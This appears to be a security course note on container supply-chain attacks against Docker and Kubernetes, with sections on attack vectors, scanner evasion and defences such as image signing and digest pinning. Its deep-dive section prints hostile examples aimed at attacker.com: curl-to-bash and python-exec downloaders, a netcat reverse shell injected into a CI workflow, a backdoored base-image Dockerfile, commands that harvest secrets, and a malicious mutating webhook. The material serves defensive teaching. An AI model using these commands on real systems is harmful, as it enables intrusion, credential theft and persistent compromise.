---
tags: [kubernetes, supply-chain, docker, containers, vapt]
difficulty: advanced
module: "38 - Container and Kubernetes Security"
topic: "38.21 Supply Chain Containers"
---

# Supply Chain — Malicious Container Images

## Introduction
The software supply chain for modern cloud-native applications heavily relies on container images. A typical container ecosystem involves base images (often pulled from public registries like Docker Hub or Quay.io), source code compilation, CI/CD pipelines building the final image, pushing to an enterprise registry, and finally deploying to Kubernetes.

A compromise at any point in this chain allows an attacker to inject malicious code (cryptominers, reverse shells, backdoors) into the environment. Supply chain attacks are highly asymmetric: compromising a single widely-used base image can infect thousands of downstream organizations simultaneously.

## Core Concepts & Attack Architecture

```text
+-------------------+        +--------------------+        +---------------------+
|   Public Registry |        |   CI/CD Pipeline   |        | Internal Enterprise |
|   (Docker Hub)    |        |  (GitHub Actions)  |        |      Registry       |
|                   |        |                    |        |                     |
|  [ubuntu:latest]  | =====> |  Dockerfile:       | =====> | [myapp:v1.0-mal]    |
|  [node:alpine]    |        |  FROM node:alpine  |        |                     |
|  (Typosquatting/  |        |  RUN npm install   |        |                     |
|   Poisoning)      |        |                    |        |                     |
+-------------------+        +---------+----------+        +----------+----------+
                                       ^                              |
                                       |                              v
                             +---------+----------+        +----------+----------+
                             | Attacker commits   |        | Kubernetes Cluster  |
                             | malicious code /   |        |                     |
                             | alters CI script   |        | Kubelet pulls image |
                             +--------------------+        | and executes malware|
                                                           +---------------------+
```

## Vectors for Container Supply Chain Attacks

### 1. Public Registry Poisoning & Typosquatting
Developers frequently pull base images from public repositories without verifying their authenticity.
- **Typosquatting**: Attackers upload malicious images with names closely resembling popular ones (e.g., `ubutu:latest` instead of `ubuntu:latest`, or `doccker/compose`).
- **Abandoned Repositories**: Attackers take over abandoned but popular namespaces on Docker Hub to push malicious updates.
- **Malicious Payload**: These images usually contain the expected functionality (so the app works) but include a hidden background process, such as an XMRig cryptominer or an eBPF-based rootkit.

### 2. CI/CD Pipeline Compromise
The CI/CD server (Jenkins, GitLab CI, GitHub Actions) is the engine that builds container images. It holds high privileges, often containing secrets for the container registry and the Kubernetes cluster.
- **Compromised Build Scripts**: An attacker with commit access to the repository modifies the `Dockerfile`.
  ```dockerfile
  # Malicious addition in Dockerfile
  RUN curl -s http://attacker.com/backdoor.sh | bash
  ```
- **Runner Exploitation**: Exploiting vulnerabilities in the CI/CD runner itself (e.g., escaping a GitHub Actions runner container) to steal the registry credentials and manually push a malicious image tag (e.g., overwriting `myapp:latest`).

### 3. Dependency Confusion & Malicious Packages
Container builds frequently include package manager commands (`npm install`, `pip install`, `apt-get`).
- If an internal package is referenced but not properly scoped, the package manager might fetch a malicious public package with the same name (Dependency Confusion).
- Once the image is built, the malware is baked into the image layers.

### 4. Overwriting Image Tags (Mutable Tags)
Tags like `:latest`, `:staging`, or `:v1` are mutable. They act as pointers to a specific image digest (SHA256).
- If an organization does not enforce strict immutability in their internal registry, an attacker who steals registry credentials can push a malicious image and tag it as `myapp:latest`. 
- The next time the Kubernetes pod restarts or scales, the `kubelet` will pull the newly poisoned `:latest` image.

## Advanced Avoidance Techniques (Evading Scanners)
Attackers modify their payloads to bypass vulnerability scanners like Trivy, Grype, or Clair.
- **Multi-stage Builds for Concealment**: Attackers use multi-stage builds to compile malware, hiding the source code and leaving only a stripped binary.
- **Obfuscation**: Using base64, XOR encoding, or packing (UPX) malicious binaries so static scanners don't recognize the file signatures.
- **Living off the Land (LotL)**: Instead of injecting a known malware binary, attackers modify existing shell scripts (e.g., modifying the `entrypoint.sh` script to open a reverse shell using built-in `bash` or `python` before starting the main application).

## Defense & Mitigation

### 1. Image Signing & Verification (Cosign / Notary)
Implement cryptographic signing for container images.
- **Sigstore Cosign**: Developers sign the image using Cosign.
  ```bash
  cosign sign --key cosign.key myregistry.com/myapp:v1.0
  ```
- **Kubernetes Enforcement**: Use an admission controller (like Kyverno or OPA) to verify the Cosign signature before allowing the pod to run. If the signature is missing or invalid, the deployment is blocked.

### 2. Immutable Image Tags & Digests
Configure container registries to make tags immutable.
In Kubernetes manifests, deploy images using their strict SHA256 digest rather than mutable tags.
```yaml
# Bad
image: myregistry.com/myapp:latest

# Good
image: myregistry.com/myapp@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2
```

### 3. Vulnerability Scanning and SBOMs
- **SBOM (Software Bill of Materials)**: Generate SBOMs using tools like `Syft` during the CI/CD process to track all dependencies.
- **Continuous Scanning**: Scan images both in the registry and continuously at runtime (using Trivy or Falco) to detect if a previously trusted image is suddenly flagged with a high-severity CVE.

### 4. Minimal Base Images
Use Distroless images or `scratch`. These images contain only the compiled application and its direct dependencies—no shell, no package manager, no core utilities. This severely limits an attacker's ability to execute arbitrary commands even if they gain code execution.


## Deep Dive: CI/CD Runner Escapes and Image Poisoning
When an attacker compromises a CI/CD pipeline, the actual execution context is usually a temporary container running the build job (e.g., a Jenkins agent or GitLab runner pod).

### Extracting Secrets from the Runner
Build containers are often injected with highly sensitive environment variables or secrets necessary to push images to the registry.
```bash
# Inside a compromised CI pipeline step
echo "Extracting Docker Auth..."
cat ~/.docker/config.json
env | grep -i 'token\|secret\|password\|auth'
```

### Modifying the Source Code on the Fly
Instead of changing the `Dockerfile`, an attacker can insert a backdoor directly into the application's source code during the build process.
If the CI runs: `make build && docker build -t app .`
An attacker can inject a step:
```yaml
# GitHub Actions compromised workflow
steps:
  - uses: actions/checkout@v2
  - name: Malicious Injection
    run: |
      echo 'import os; os.system("nc -e /bin/sh attacker.com 4444 &")' >> main.py
  - name: Build Image
    run: docker build -t mycompany/myapp:latest .
  - name: Push Image
    run: docker push mycompany/myapp:latest
```

### The Anatomy of a Backdoored Base Image
Consider an attacker who successfully publishes `node:14-alpine-patched` on a public registry. What does the backdoor look like?
Often, it leverages LD_PRELOAD or PAM backdoors to ensure persistence and evade detection.

```dockerfile
# Malicious Dockerfile used to build the poisoned base image
FROM node:14-alpine
# Install a rootkit or backdoor
RUN apk add --no-cache curl build-base && \
    curl -o /tmp/backdoor.c http://attacker.com/backdoor.c && \
    gcc -shared -fPIC /tmp/backdoor.c -o /lib/libpam_hook.so && \
    echo "export LD_PRELOAD=/lib/libpam_hook.so" >> /etc/profile
# Keep standard entrypoint to not break downstream applications
ENTRYPOINT ["docker-entrypoint.sh"]
CMD ["node"]
```

### Bypassing Image Scanners
Vulnerability scanners primarily check the package manager database (`/var/lib/dpkg/status` or `/lib/apk/db/installed`). 
An attacker can evade scanning by compiling the malware statically and placing it outside standard system paths, or by utilizing "fileless" techniques within the container (executing entirely from memory).
```bash
# Downloading and executing an eBPF backdoor directly into memory via Python
python3 -c "import urllib.request; exec(urllib.request.urlopen('http://attacker.com/ebpf_loader.py').read())"
```

### Leveraging Mutating Webhooks for Supply Chain Attacks
If an attacker compromises the cluster and has permissions to create MutatingAdmissionWebhooks, they can establish a persistent supply chain attack *inside* the cluster.
Whenever a new Pod is deployed, the Mutating Webhook automatically rewrites the `image` field to point to the attacker's backdoored version.
```yaml
# Attacker's Mutating Webhook Payload
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: shadow-injector
webhooks:
  - name: shadow.injector.attacker.com
    rules:
      - operations: ["CREATE"]
        apiGroups: [""]
        apiVersions: ["v1"]
        resources: ["pods"]
    clientConfig:
      url: "https://attacker-webhook.kube-system.svc:443/mutate"
```
Every application deployed in the cluster is now compromised at the deployment phase.

## Chaining Opportunities
- **[[06 - CI-CD Pipeline Security]]**: CI/CD compromises directly lead to container supply chain attacks by allowing attackers to tamper with `Dockerfiles`.
- **[[20 - Admission Controller Bypass]]**: If signature verification is enforced by an admission controller, attackers must bypass the controller to run their unsigned malicious images.
- **[[19 - Lateral Movement in K8s]]**: Once the malicious container runs in the cluster, it will attempt lateral movement, establishing C2 and scanning the internal network.

## Related Notes
- [[11 - Dependency Confusion Attacks]]
- [[22 - Defense — Pod Security Admission, Network Policies, RBAC Hardening]]
